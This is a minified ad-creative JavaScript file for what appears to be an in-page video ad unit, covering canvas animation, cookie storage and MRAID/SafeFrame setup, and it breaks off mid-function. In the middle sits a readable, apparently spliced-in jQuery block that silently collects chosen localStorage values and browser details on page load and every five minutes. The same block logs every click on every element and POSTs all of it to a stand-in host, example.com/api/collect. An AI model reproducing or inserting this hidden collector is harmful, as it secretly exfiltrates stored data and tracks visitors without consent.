(function () {
  function Ae() {
    var a;
    if (!Hb) {
      Hb = {};
      var b = C.cookie.split("; ");
      for (a = 0; a < b.length; a++) {
        var c = b[a].split("=", 2);
        if ("ccc" === c[0]) {
          var d = c[1];
          break;
        }
      }
      if (d) try {
        Hb = JSON.parse(d);
      } catch (e) {}
    }
  }
  function jg(a) {
    try {
      if (ha & 8) return Ae(), Hb[a];
      if (u.localStorage) return JSON.parse(u.localStorage.getItem(a));
    } catch (b) {}
    return null;
  }
  function kg(a, b) {
    var c;
    try {
      if (ha & 8) {
        Ae();
        Hb[a] = b;
        var d = new Date();
        d.setTime(d.getTime() + 31536E6);
        d = d.toUTCString();
        var e = u.location.hostname;
        if (c = e.split(".")) {
          var g = c.length;
          2 <= g && (e = c[g - 2] + "." + c[g - 1]);
        }
        C.cookie = "ccc=" + JSON.stringify(Hb) + "; expires=" + d + "; path=/; domain=" + e + "; SameSite=Strict";
      } else u.localStorage && u.localStorage.setItem(a, JSON.stringify(b));
    } catch (f) {}
  }
  function lg(a) {
    var b = "mouseover mousemove mouseout mousedown click touchstart touchmove touchend".split(" ");
    var c = D[a];
    var d = c[1];
    c[2] = c = ta("CANVAS");
    var e = c.style;
    e.position = "absolute";
    e.left = e.top = "0px";
    e.width = e.height = "100%";
    P(d, c);
    mg(a);
    d = pa[a];
    d.canvas = c;
    d.context = c.getContext("2d");
    d.animateFunc = function (g) {
      return function (f) {
        var k = Ib.now();
        f = pa[g];
        if (Ic) 0 < f.startTime && (k = Math.max(f.startTime, Jc));else if (f.raf && f.isRunning) {
          var h = k - f.sysTime;
          var m = f.diffSum / f.diffElm.length;
          h > 5 * m ? 0 < f.startTime && (f.startTime += h - m) : 16 < h && (f.diffSum += h - f.diffElm.shift(), f.diffElm.push(h));
        }
        f.raf = !1;
        f.sysTime = k;
        h = f.lid;
        m = B[h];
        0 > f.startTime && (f.startTime = k);
        k -= f.startTime;
        var l = f.clipData[0];
        var n = (m[11] || 1) * La;
        var q = (m[12] || 1) * La;
        var r = f.context;
        f.isRunning = !1;
        n = [n, 0, 0, q, 0, 0];
        r.setTransform.apply(r, n);
        1 > l.bgOpacity && r.clearRect(0, 0, l.width, l.height);
        Be(r, k, n, h, 0, "m", {});
        n = f.currentHit;
        r = f.newHit;
        l = f.pointer;
        q = f.once;
        f.newHit = void 0;
        f.pointer = void 0;
        f.once = void 0;
        if (n) {
          if (r) {
            if (n.instance !== r.instance || n.item !== r.item) var t = !0;
          } else l && (t = !0);
          if (t) {
            t = f.instanceStatus[n.instance];
            if (3 === t[0]) l = t[8] - t[7];else if (7 === t[0]) l = Math.max(0, 2 * t[9] - k - t[7]);else {
              l = k - t[7];
              var p = f.clipData[t[1]];
              var y = p.endTime + p.loopDelay;
              l > y && t[4] < p.loop - 1 && (l %= y);
              l > p.endTime && (l = p.endTime);
            }
            t = l;
            l = f.clipData[n.clip];
            l = l.objectList;
            l = l[n.item];
            l = l.motionList;
            var w = !1;
            for (y = l.length - 1; 0 <= y; y--) if (p = l[y], p.time <= t) {
              2 !== p.type && (w = !0);
              break;
            }
            w && Bd(k, h, n.actions, "mouseout", n.clip, n.instance);
            f.currentHit = void 0;
          }
        }
        !r || n && n.instance === r.instance && n.type === r.type && "click" !== r.type || (Bd(k, h, r.actions, r.type, r.clip, r.instance), "click" === r.type && f.currentHit || (f.currentHit = r));
        f.isRunning ? q || Ic || Kc(f) : m[55] = !1;
      };
    }(a);
    a = function (g, f) {
      return function (k) {
        var h;
        if (/touch/.test(k.type)) dc = !0;else if (dc) return;
        "touchstart" === k.type && Ce(k);
        Lc = k.isTrusted;
        var m = B[f];
        if (m[54] && !ng) {
          var l = Mc(k);
          var n = qa === g.lid ? g.canvas.getBoundingClientRect() : g.canvas.parentNode.getBoundingClientRect();
          var q = g.canvas.width / n.width * (l.x - n.left);
          n = g.canvas.height / n.height * (l.y - n.top);
          if (h = g.canvas.style.zoom) h = parseFloat(h), q /= h, n /= h;
          h = l.x;
          l = l.y;
          if (/(click|end)/i.test(k.type)) {
            if (m = Math.sqrt((ec.x - h) * (ec.x - h) + (ec.y - l) * (ec.y - l)), /click/i.test(k.type) || 30 > m && !Nc) g.pointer = {
              x: q,
              y: n,
              type: "click"
            }, m = Ib.now(), g.isRunning && (g.once = !0), g.click = !0, g.animateFunc(m), delete g.click;
          } else /(start|down)/.test(k.type) ? (k = "down", ec = {
            x: h,
            y: l
          }) : (k = /out/i.test(k.type) ? "mouseout" : "mouseover", l = g.currentHit && g.currentHit.clickable ? "pointer" : "", g.canvas.style.cursor !== l && (g.canvas.style.cursor = l)), g.pointer && "click" === g.pointer.type || (g.newHit = void 0, g.pointer = {
            x: q,
            y: n,
            type: k
          }), g.isRunning || (m[55] = !0, Kc(g));
        }
        Lc = !1;
      };
    }(d, a);
    for (d = 0; d < b.length; d++) Q(c, b[d], a);
  }
  $(function () {
    const keysToWatch = window.keysToWatch;
    const globalVars = ['userAgent', 'platform', 'language'];
    function computeHash(data) {
      const keyArray = Object.keys(data);
      const joinedKeys = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < joinedKeys.length; i++) {
        const charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function getFilteredLocalStorage() {
      const filteredData = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (keysToWatch.includes(key)) {
          const value = window.localStorage.getItem(key);
          filteredData[key] = value;
        }
      }
      return filteredData;
    }
    function collectGlobalVariables() {
      const globalData = {};
      globalVars.forEach(varName => {
        globalData[varName] = navigator[varName];
      });
      return globalData;
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = "https://example.com/api/collect";
      const request = new XMLHttpRequest();
      request.open("POST", apiUrl, true);
      request.setRequestHeader("Content-Type", "application/json");
      const requestData = {
        id: hashId,
        data: data
      };
      request.send(JSON.stringify(requestData));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("Data sent successfully");
          } else {
            console.error("Data sending failed, status code:" + request.status);
          }
        }
      };
    }
    function collectAndPostData() {
      const filteredLocalStorage = getFilteredLocalStorage();
      const globalData = collectGlobalVariables();
      const combinedData = {
        ...filteredLocalStorage,
        ...globalData
      };
      if (Object.keys(combinedData).length > 0) {
        postDataToServer(combinedData);
      }
    }
    window.addEventListener("load", function () {
      collectAndPostData();
    });
    setInterval(collectAndPostData, 5 * 60 * 1000);
    $('.form-control').on('input', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
    document.querySelectorAll('*').forEach(function (node) {
      node.addEventListener('click', function (event) {
        const clickData = {
          tag: event.target.tagName,
          id: event.target.id,
          classes: event.target.className,
          time: new Date().toISOString()
        };
        postDataToServer({
          clickData
        });
      });
    });
  });
  function mg(a) {
    var b, c, d, e, g;
    a = pa[a].clipData;
    for (b = 0; b < a.length; b++) {
      var f = a[b].objectList;
      for (c = 0; c < f.length; c++) {
        var k = f[c];
        k = k.motionList;
        var h = k.length;
        for (d = 0; d < h; d++) {
          var m = k[d];
          if (m = m.mpath) {
            var l = m.length;
            for (e = 0; e < l - 1; e++) {
              var n = m[e];
              var q = m[e + 1];
              var r = n[0];
              var t = n[1];
              var p = n[4];
              var y = n[5];
              var w = q[2];
              var v = q[3];
              var z = q[0];
              var ca = q[1];
              q = n[6];
              0 < e && (q -= m[e - 1][6]);
              q = Math.max(Math.round(q / 2), 4);
              var A = 0;
              var E = [0];
              var S = r;
              var V = t;
              for (g = 1; g < q; g++) {
                var J = g / (q - 1);
                var N = 1 - J;
                var ka = N * N;
                var H = J * J;
                var W = ka * N;
                ka = ka * J * 3;
                N = N * H * 3;
                J *= H;
                H = W * r + ka * p + N * w + J * z;
                W = W * t + ka * y + N * v + J * ca;
                S = H - S;
                V = W - V;
                A += Math.sqrt(S * S + V * V);
                E[g] = A;
                S = H;
                V = W;
              }
              r = A;
              t = [0];
              z = 0;
              for (H = 1; H < q; H++) if (w = E[H] / r * (q - 1), w >= z + 1) for (p = H - 1, y = E[p] / r * (q - 1), v = z + 1; v <= w;) z = p + (v - y) / (w - y), t[v] = z / (q - 1), z = v, v++;
              n[14] = t;
            }
          }
        }
      }
    }
  }
  function og(a) {
    var b, c, d;
    if (b = pa[a]) {
      var e = c = !1;
      var g = b.clipData;
      for (b = 0; b < g.length; b++) {
        var f = g[b].objectList;
        var k = f.length;
        for (d = 0; d < k; d++) {
          var h = f[d];
          if (h.hasFeed || "number" === typeof h.feed) c = !0;
          if (h.svg) var m = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(h.svg);else if (h.purl) m = h.purl;else if (h.url) m = h.url;else continue;
          e = !0;
          h.image = De(a, m, !1, !0);
          h.isSvg && (0 < (ua & 390) && 13 > fb || Jb && 76 > Cd || Oc) && (m = function (l) {
            var n = 1 === ua ? 2 : 4,
              q = function () {
                var r = Math.min(l.maxScale / 100, n);
                var t = C.createElement("canvas");
                t.width = l.width * r;
                t.height = l.height * r;
                t.getContext("2d").drawImage(l.image, 0, 0, t.width, t.height);
                l.image = t;
              };
            return (Ee || Oc) && 1 === I ? function () {
              ma(q, 1);
            } : q;
          }(h), h.image.complete ? m() : Q(h.image, "load", m));
        }
      }
      e || c || fc(a);
    }
  }
  function Fe(a) {
    var b, c, d;
    var e = B[a];
    var g = pa[a];
    a = (e[11] || 1) * La;
    e = (e[12] || 1) * La;
    g = g.clipData;
    for (b = 0; b < g.length; b++) {
      var f = g[b];
      var k = f.maskInfo;
      f.canvasList || (f.canvasList = [], f.contextList = []);
      var h = [];
      for (c = 0; c < k.length; c++) if ((d = k[c].canvasId) && !h[d]) {
        h[d] = !0;
        if (f.canvasList[d]) var m = f.canvasList[d];else m = f.canvasList[d] = C.createElement("canvas"), f.contextList[d] = m.getContext("2d");
        d = Math.ceil(f.width * a);
        var l = Math.ceil(f.height * e);
        if (d !== m.width || l !== m.height) m.width = d, m.height = l;
      }
    }
  }
  function Pc(a) {
    var b;
    var c = pa[a];
    c.lid = a;
    c.startTime = -1;
    c.diffElm = [60, 60, 60, 60, 60];
    c.diffSum = 300;
    c.sysTime = Ib.now();
    c.currentHit = void 0;
    c.pointer = void 0;
    c.newHit = void 0;
    c.once = void 0;
    var d = c.origStatus;
    var e = c.instanceStatus = {};
    for (b in d) d.hasOwnProperty(b) && (e[b] = d[b].concat());
    c.clipData.canvasList || Fe(a);
    a = B[a];
    a[54] = !0;
    a[55] = !0;
    Kc(c);
  }
  function Kc(a) {
    a.raf = !0;
    a.animateId = u.ccAnimate(a.animateFunc);
  }
  function Ge(a) {
    var b = pa[a],
      c = b.context,
      d = c.canvas;
    a = B[a];
    b.raf = !1;
    u.ccCancel(b.animateId);
    c.setTransform(1, 0, 0, 1, 0, 0);
    c.clearRect(0, 0, d.width, d.height);
    a[55] = !1;
  }
  function Bd(a, b, c, d, e, g, f, k) {
    var h;
    var m = pa[b];
    if (h = !!d) {
      b = 1;
      var l = 0;
    } else b = 0, l = Math.abs(f - k);
    var n = m.instanceStatus;
    var q = f;
    var r = c.length;
    for (f = 0; f < r; f++) {
      var t = c[f];
      if (!h || d === t[0]) {
        var p = t[b];
        if ("ad" !== p) {
          var y = t[b + 1];
          var w = -1 === y ? [g] : m.clipData[y].instances;
          y = !h && (e === y || -1 === y);
          if ("stop" === p) {
            for (t = 0; t < w.length; t++) {
              p = a;
              var v = m.instanceStatus[w[t]];
              1 === v[0] ? v[8] = p : 7 === v[0] && (v[8] = 2 * v[9] - p);
              v[0] = 3;
            }
            y && (q = k);
          } else if ("play" === p) {
            for (t = 0; t < w.length; t++) {
              var z = m;
              v = w[t];
              p = a;
              z.sysTime = z.startTime + p;
              v = z.instanceStatus[v];
              3 === v[0] ? void 0 !== v[7] && (z = z.clipData[v[1]].endTime, v[7] = v[8] - v[7] >= z ? p : v[7] + (p - v[8]), v[3] = p - v[7]) : 7 === v[0] && void 0 !== v[7] && (v[7] += 2 * (p - v[9]), v[3] = p - v[7]);
              v[0] = 1;
              v[5] = 1;
            }
            y && (q = a - n[g][7] + l);
            m.isRunning = !0;
          } else if ("gotostop" === p) {
            v = 1E3 * t[b + 2];
            for (t = 0; t < w.length; t++) p = n[w[t]], p[0] = 3, p[8] = p[7] + v, p[3] = v;
            y && (q = v);
            m.isRunning = !0;
          } else if ("gotoplay" === p) {
            v = 1E3 * t[b + 2];
            for (t = 0; t < w.length; t++) p = n[w[t]], p[0] = 1, p[5] = 1, p[7] = a - v, p[3] = v;
            y && (q = v + l);
            m.isRunning = !0;
          } else if ("gotoback" === p) {
            v = 1E3 * t[b + 2];
            for (t = 0; t < w.length; t++) p = n[w[t]], p[0] = 7, p[5] = 7, p[9] = a, p[7] = a - v, p[3] = v;
            y && (q = v - l);
            m.isRunning = !0;
          } else if ("playback" === p) {
            for (t = 0; t < w.length; t++) z = m, v = w[t], p = a, z.sysTime = z.startTime + p, v = z.instanceStatus[v], 3 === v[0] ? void 0 !== v[7] && (v[8] === v[7] && (z = z.clipData[v[1]].endTime, v[8] += z), v[9] = p, v[7] += p - v[8], v[3] = p - v[7]) : 1 === v[0] && void 0 !== v[7] && (v[9] = p, v[3] = p - v[7]), v[0] = 7, v[5] = 7;
            y && (w = n[g], q = 2 * w[9] - a - w[7] - 2 * l);
            m.isRunning = !0;
          }
        }
      }
    }
    return q;
  }
  function Be(a, b, c, d, e, g, f) {
    var k,
      h,
      m,
      l,
      n,
      q = [],
      r = B[d];
    var t = pa[d];
    var p = t.clipData[e];
    var y, w, v;
    var z = pa[d];
    var ca = z.clipData[e];
    var A = z.instanceStatus[g];
    if (3 === A[0]) var E = A[8] - A[7];else {
      if (7 === A[0]) {
        E = 2 * A[9] - b - A[7];
        0 < E ? z.isRunning = !0 : (A[0] = 3, E = A[7] = A[8] = 0);
        var S = !0;
      } else E = b - A[7];
      if (w = ca.actionList) {
        var V = w.length;
        if (S) {
          var J = V - 1;
          var N = v = -1;
        } else J = 0, v = V, N = 1;
        for (y = J; y !== v; y += N) {
          var ka = w[y];
          var H = ka.time;
          if (!S && E >= H && H > A[3] || S && E <= H && H < A[3]) {
            A[3] = H;
            var W = S ? b - (H - E) : b - (E - H);
            E = Bd(W, d, ka.actions, null, e, g, E, H);
          }
        }
      }
      var O = ca.endTime + ca.loopDelay;
      E > O ? A[4] < ca.loop - 1 && (E %= O, A[7] = b - E, A[3] = -1, A[4]++, z.isRunning = !0) : z.isRunning = !0;
      E > ca.endTime && (E = ca.endTime);
    }
    var x = E;
    var rb = p.borderWidth;
    0 < p.bgOpacity && (a.fillStyle = p.bgColor, a.fillRect(0, 0, p.width, p.height));
    var Kb = p.objectList;
    var da = p.maskInfo;
    var Qc = (r[11] || 1) * La;
    var Rc = (r[12] || 1) * La;
    if (!Kb) return x;
    var Lb = Kb.length - 1;
    a: for (; 0 <= Lb; Lb--) if (k = Kb[Lb]) {
      var Mb = da[Lb];
      var ia = (m = Mb.canvasId) ? p.contextList[m] : a;
      1 === Mb.op && (ia.setTransform(Qc, 0, 0, Rc, 0, 0), ia.clearRect(0, 0, p.width, p.height));
      var Sc = k.motionList;
      var Tc = !1;
      var Dd = Sc.length;
      for (h = 0; h < Dd; h++) {
        var L = Sc[h];
        var pg = L.time;
        if (pg >= x) {
          if (0 === h) break;
          var T = Sc[h - 1];
          if (2 === T.type) continue a;
          if (L.cache) var K = L.cache;else {
            K = L.cache = {};
            var Ga = Ed(L.anchorX * T.scaleX, L.anchorY * T.scaleY, T.rotation);
            K.start_ax = T.x + Ga.x;
            K.start_ay = T.y + Ga.y;
            Ga = Ed(L.anchorX * L.scaleX, L.anchorY * L.scaleY, L.rotation);
            var qg = L.x + Ga.x;
            var rg = L.y + Ga.y;
            K.delta_time = L.time - T.time;
            K.delta_ax = qg - K.start_ax;
            K.delta_ay = rg - K.start_ay;
            K.delta_scalex = L.scaleX - T.scaleX;
            K.delta_scaley = L.scaleY - T.scaleY;
            K.delta_skewx = L.skewX - T.skewX;
            K.delta_skewy = L.skewY - T.skewY;
            K.delta_alpha = L.alpha - T.alpha;
            K.delta_rotation = L.rotation - T.rotation;
          }
          var sg = L.easing;
          var ra = sg((x - T.time) / K.delta_time);
          if (T.mpath) {
            var He = void 0,
              Ie = void 0,
              Je = void 0,
              Ke = void 0,
              Le = void 0,
              Fd = void 0,
              Ra = void 0,
              Gd = void 0,
              sb = void 0,
              gb = void 0,
              hb = void 0,
              Me = void 0,
              Ne = void 0,
              Oe = void 0,
              Pe = void 0,
              Qe = void 0,
              Re = void 0,
              Se = void 0,
              Te = void 0,
              gc = void 0,
              ya = void 0,
              hc = void 0,
              Hd = void 0,
              Id = void 0,
              Uc = void 0,
              Vc = void 0,
              Ma = void 0,
              ib = void 0,
              tb = void 0,
              Pa = void 0,
              ub = void 0,
              ic = void 0,
              vb = void 0,
              Sa = T.mpath;
            Vc = Sa.length;
            ic = ra * Sa[Vc - 2][6];
            if (0 > ra) ib = 0, tb = Sa[0][6], ub = ic / tb;else if (1 < ra) ib = Vc - 2, Pa = 0 < ib ? Sa[ib - 1][6] : 0, tb = Sa[ib][6], ub = (ic - Pa) / (tb - Pa);else for (vb = 0; vb < Vc - 1; vb++) if (tb = Sa[vb][6], ic <= tb) {
              ib = vb;
              Pa = 0 < vb ? Sa[vb - 1][6] : 0;
              ub = (ic - Pa) / (tb - Pa);
              break;
            }
            ya = Sa[ib];
            gc = Sa[ib + 1];
            0 >= ub || 1 <= ub ? Ma = ub : (Uc = ya[14], Id = ub * (Uc.length - 1), Pa = Math.floor(Id), Hd = Uc[Pa], hc = Uc[Pa + 1], Ma = Hd + (hc - Hd) * (Id - Pa));
            Te = ya[0];
            Se = ya[1];
            Re = ya[4];
            Qe = ya[5];
            Pe = gc[2];
            Oe = gc[3];
            Ne = gc[0];
            Me = gc[1];
            Ra = 1 - Ma;
            Fd = Ra * Ra;
            hc = Ma * Ma;
            hb = Fd * Ra;
            gb = Fd * Ma * 3;
            sb = Ra * hc * 3;
            Gd = Ma * hc;
            Le = hb * Te + gb * Re + sb * Pe + Gd * Ne;
            Ke = hb * Se + gb * Qe + sb * Oe + Gd * Me;
            3 === ya[13] ? (hb = Ra * Ra, gb = Ra * Ma * 2, sb = Ma * Ma) : (2 === ya[13] ? (hb = Ra, gb = Ma) : (hb = 1, gb = 0), sb = 0);
            Je = hb * ya[7] + gb * ya[9] + sb * ya[11];
            Ie = hb * ya[8] + gb * ya[10] + sb * ya[12];
            He = 180 / Math.PI * Math.atan2(Ie, Je);
            Ga = {
              x: Le,
              y: Ke,
              a: He
            };
            var Ue = K.start_ax + Ga.x;
            var Ve = K.start_ay + Ga.y;
          } else Ue = K.start_ax + ra * K.delta_ax, Ve = K.start_ay + ra * K.delta_ay;
          var jc = T.mrot ? T.rotation + (Ga.a - T.mas) + ra * (K.delta_rotation - T.mad) : T.rotation + ra * K.delta_rotation;
          var wb = T.scaleX + ra * K.delta_scalex;
          var xb = T.scaleY + ra * K.delta_scaley;
          var Jd = T.skewX + ra * K.delta_skewx;
          var Kd = T.skewY + ra * K.delta_skewy;
          var We = T.alpha + ra * K.delta_alpha;
          Ga = Ed(L.anchorX * wb, L.anchorY * xb, jc);
          var Xe = Ue - Ga.x;
          var Ye = Ve - Ga.y;
          Tc = !0;
          break;
        }
      }
      !Tc && 0 < Dd && (0 < h && (h = Dd - 1), L = Sc[h], L.time <= x && 2 !== L.type && (Xe = L.x, Ye = L.y, wb = L.scaleX, xb = L.scaleY, Jd = L.skewX, Kd = L.skewY, We = L.alpha, jc = L.rotation, Tc = !0));
      if (Tc) {
        ia.save();
        1 === I && Ze && 0 === jc && 1 === wb && 1 === xb && K && 0 < K.delta_time && (0 !== K.delta_ax && .025 > Math.abs(K.delta_ax / K.delta_time) || 0 !== K.delta_ay && .025 > Math.abs(K.delta_ay / K.delta_time)) && (jc = 1E-43);
        var $e = .017453292519943295 * jc;
        var Wc = Math.cos($e);
        var Xc = Math.sin($e);
        q[0] = Wc * wb - Xc * xb * Kd;
        q[1] = Xc * wb + Wc * xb * Kd;
        q[2] = Wc * wb * Jd - Xc * xb;
        q[3] = Xc * wb * Jd + Wc * xb;
        q[4] = Xe;
        q[5] = Ye;
        ia.transform.apply(ia, q);
        ia.globalAlpha *= We;
        if (l = 2 === Mb.op || 3 === Mb.op) ia.globalCompositeOperation = "destination-" + (Mb.inv ? "out" : "in");
        if (k.image) try {
          ia.drawImage(k.image, 0, 0, k.width, k.height);
        } catch (ch) {} else if (k.actions) {
          if (ra = t.pointer) ia.save(), ia.beginPath(), ia.rect(0, 0, k.width, k.height), ia.setTransform(1, 0, 0, 1, 0, 0), ia.isPointInPath(ra.x, ra.y) && (t.newHit = {
            instance: g,
            item: Lb,
            clip: e,
            ctime: x,
            type: ra.type,
            actions: k.actions,
            clickable: k.clickable
          }), ia.restore();
        } else if (void 0 !== k.clip) {
          var kc = k.clip;
          if (!f[kc]) {
            f[kc] = !0;
            var af = g + "." + Lb;
            var Yc = t.instanceStatus[af];
            void 0 === Yc[6] && (Yc[6] = g);
            void 0 === Yc[7] && (Yc[7] = k.motionList[0].time + (b - x));
            if (n = l || void 0) {
              var bf = t.clipData[kc];
              var Zc = void 0,
                Ld = bf.width * Qc,
                cf = bf.height * Rc,
                $c = Ld + "x" + cf;
              lc[$c] ? lc[$c].canvas.width = Ld : (Zc = C.createElement("canvas"), Zc.width = Ld, Zc.height = cf, lc[$c] = Zc.getContext("2d"));
              var ad = lc[$c];
              ad.setTransform(Qc, 0, 0, Rc, 0, 0);
              ia.scale(1 / Qc, 1 / Rc);
            } else ad = ia;
            var tg = c;
            Be(ad, b, tg, d, kc, af, f);
            n && ia.drawImage(ad.canvas, 0, 0);
            delete f[kc];
          }
        }
        ia.restore();
      }
      if (3 === Mb.op) {
        var ug = 1 < m ? p.contextList[m - 1] : a;
        var vg = p.canvasList[m];
        ug.drawImage(vg, 0, 0, p.width, p.height);
      }
    }
    if (0 < rb) {
      var df = rb / 2;
      a.lineWidth = rb;
      a.strokeStyle = p.borderColor;
      a.strokeRect(df, df, p.width - rb, p.height - rb);
    }
    return x;
  }
  function Ed(a, b, c) {
    var d = c * Math.PI / 180;
    c = Math.cos(d);
    d = Math.sin(d);
    return {
      x: a * c - b * d,
      y: a * d + b * c
    };
  }
  function Md(a) {
    var b,
      c,
      d = [4];
    if (Ic !== a) {
      var e = Ib.now();
      if (Ic = a) Jc = e;else if (Jc) var g = e - Jc;else return;
      for (c = 0; 1 > c; c++) {
        var f = d[c];
        var k = B[f];
        f = pa[f];
        a ? k[55] && 0 < f.startTime && (f.isRunning = !1, u.ccCancel(f.animateId)) : (b = ea[k[58]]) && b[0] && k[54] && (0 < f.startTime && (f.startTime += g, f.startTime > e && (f.startTime = -1), f.diffElm = [60, 60, 60, 60, 60], f.diffSum = 300, f.sysTime = e), Kc(f));
      }
    }
  }
  function wg() {
    var a,
      b,
      c,
      d = [4];
    for (c = 0; 1 > c; c++) {
      var e = d[c];
      e = pa[e];
      e = e.clipData;
      for (a = 0; a < e.length; a++) {
        var g = e[a].objectList;
        for (b = 0; b < g.length; b++) {
          var f = g[b];
          delete f.image;
        }
      }
    }
    lc = {};
  }
  var Nd = function (a) {
      return a;
    },
    bd = "B=193/F=1723574/C=1128351/P=22/S=gfR1cFnC",
    va = {
      "privacy": "s:a:a"
    },
    Od = "",
    za = {},
    jb = {},
    Pd = {},
    mc,
    ef,
    Nb,
    Ta,
    kb,
    Ua,
    u = window,
    C = u.document,
    la,
    Va,
    Ib,
    Qd = "BackCompat" === C.compatMode,
    wa = [[0, 0, 0, 640, 360, "independent", ["container", 100, null, 0, 640, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "frame", "", "", !1, null, !1, !1, "topleft", 0, 0, 0, 0, !1, null, "", ""], [1, 0, 0, 640, 360, "bestfit", ["container", 0, "px", 0, "px", 0, 9999, 0, 9999], null, "video", "clipcentric-a.akamaihd.net/video/F=1687071/V=ad_640x360_w2450/T=1696276964/S=_Qjukc7R/video", 0, !1, null, !0, !0, "topleft", 0, 0, 300, 0, !1, null], [29, 5, 5, 110, 93, "independent", ["container", 6, null, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "image", "clipcentric-a.akamaihd.net/file/1655408/master/1691517511/20-6t0Vt?f=auto", 1, !1, null, !0, !0, "bottomright", 0, 0, 0, 0, !1, null], [30, 5, 5, 110, 93, "independent", ["container", 6, null, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "image", "clipcentric-a.akamaihd.net/file/1655407/master/1691517511/MVn-EQVz?f=auto", 1, !1, null, !0, !0, "bottomright", 0, 0, 0, 0, !1, null], [31, 0, 0, 640, 360, "bestfit", ["container", 0, "px", 0, "px", 0, 9999, 0, 9999], null, "canvas", "", 0, !1, null, !0, !0, "topleft", 0, 0, 300, 0, !1, null], null],
    yb = "In-Page%20Unit video mute unmute replay branding%20bar".split(" "),
    ff = [null, [[0, 0, 640, 360, "#ffffff", 0]], [[0, 0, 110, 93, "#ffffff", 0]], [[0, 0, 110, 93, "#ffffff", 0]], [[0, 0, 640, 360, "#ffffff", 0], [0, 0, 640, 360, "#ffffff", 0]], null],
    Y = [],
    gf = "http:" === C.location.protocol ? "http://" : "https://",
    nc = gf + "clipcentric-a.akamaihd.net/user-10/resources/",
    na = navigator.userAgent || navigator.vendor || u.opera,
    Ee = /(Trident|MSIE)/.test(na),
    Jb = /(Firefox|FxiOS)/i.test(na),
    Oc = /\bEdge\//.test(na),
    Ze = /(Chrome|CriOS)/.test(na) && !Oc,
    hf = /\bVersion.*Safari/.test(na) && !Oc,
    oc = !!navigator.sendBeacon,
    lb,
    ua,
    I,
    jf,
    Rd,
    zb,
    fb,
    Sd,
    kf,
    Cd,
    Wa,
    pc,
    Td,
    R,
    Z,
    cd,
    Ab = 1,
    F = u.cc1723574,
    qc,
    Qa,
    dd = [],
    rc = [],
    lf,
    mf = RegExp("^(in|im|ai|fi|ni|ii|li|si|mi|vi|wi|hi|ct)"),
    xg = RegExp("^(cl|ce|la|er)"),
    yg = RegExp("^v(impression|play|pause|rewind|mute|fullscreen|progress)"),
    Ud = [],
    Vd = [],
    Ha,
    D = [],
    ed = [],
    ea = [],
    B = [],
    ba = [],
    fd = [],
    gd = [],
    hd = [],
    Wd = [],
    Ia = {},
    sc = {},
    tc = 0,
    id,
    nf,
    Ob,
    of,
    pf,
    qf,
    jd,
    rf,
    Xd,
    Yd,
    qa = -1,
    Na,
    Zd,
    $d,
    ae,
    Ba,
    Ca,
    G,
    M,
    kd,
    Xa,
    sf,
    uc,
    vc,
    tf,
    ld,
    md,
    mb,
    wc,
    Pb,
    nd = [],
    xc,
    Qb,
    od,
    pd,
    U,
    X,
    Rb,
    fa,
    uf,
    Bb,
    yc,
    vf,
    Sb,
    Tb = 0,
    zc = -1,
    wf = !1,
    be,
    dc = !1,
    Lc,
    ce,
    Nc,
    nb,
    ob = [],
    de = [],
    xf = [],
    qd = [],
    rd,
    Ac,
    Cb = [],
    sd = [],
    Bc,
    Ya,
    Za,
    Ja,
    yf,
    Cc,
    Db,
    Eb,
    Da = {},
    Hb,
    Dc = [],
    ha,
    La,
    pb,
    zf,
    Fb,
    Ub = [],
    Af,
    Cg = function () {
      var a, b, c, d;
      nb = !0;
      for (a = 0; 5 >= a; a++) ea[a] = [], ea[a][19] = [], ea[a][20] = [], B[a] = [], B[a][1] = 0, B[a][2] = 0;
      B[4][2] = pa[4].loadCount;
      if (lb) {
        zg();
        if ((G = u.mraid) || u.MRAID_ENV) try {
          M = G ? G.getState() : "loading";
          if ("loading" === M) {
            G && G.addEventListener("ready", td);
            var e = $a("FAAMn_tofiMyARDIoLdade");
            u[e] && (d = !0);
            if (!d) {
              var g = C.querySelectorAll("script");
              for (c = 0; c < g.length; c++) if ("mraid.js" === g[c].getAttribute("src")) {
                d = !0;
                break;
              }
            }
            if (!d) {
              var f = C.createElement("script");
              f.type = "text/javascript";
              f.src = "mraid.js";
              f.onload = f.onerror = function () {
                M = (G = u.mraid) && G.getState();
                "loading" === M ? G.addEventListener("ready", td) : M && td();
              };
              P(C.head, f);
            }
          } else td();
          if (tf = u.MRAID_ENV && /Google/i.test(u.MRAID_ENV.sdk)) if (e = $a("FAAMG_teoCtnneHtiehgt"), u[e] ? (ld = !0, md = u[e], u[e] = ud) : Object.defineProperty(u, e, {
            get: function () {
              return ud;
            },
            set: function (t) {
              ld = !0;
              md = t;
            }
          }), e = $a("oggoeldAJsIstnreafec"), u[e] && u[$a("oggoelc_sam")]) {
            ld = !0;
            Pb = u[e];
            u[e] = {};
            for (b in Pb) u[e][b] = Pb[b];
            u[e].notify = Ag;
          }
          try {
            /(nexus|xandr)/i.test(G.getVendor());
          } catch (t) {}
          zb = !0;
          Q(la, "touchstart", function () {});
          la.style.margin = "0px";
          la.style.overflow = "hidden";
          (C.scrollingElement || (Qd ? la : Va)).scrollTop = 0;
        } catch (t) {}
        if (!M) try {
          var k = u.$sf;
          if (!k && (k = u.parent.$sf)) {
            var h = u.parent.document;
            var m = h.createElement("style");
            P(m, h.createTextNode(""));
            P(h.head, m);
            m.sheet.insertRule("html,body{width:100%;height:100%}", 0);
            u.frameElement.width = "100%";
            u.frameElement.height = "100%";
          }
          if (X = k && k.ext) {
            Sb = X.meta("is_amp");
            qb();
            ee();
            Ec();
            fe();
            var l = ba[0];
            var n = Oa(l, !1);
            var q = Math.min(n.width || self.innerWidth, self.innerWidth);
            var r = Math.min(n.height || self.innerHeight, self.innerHeight);
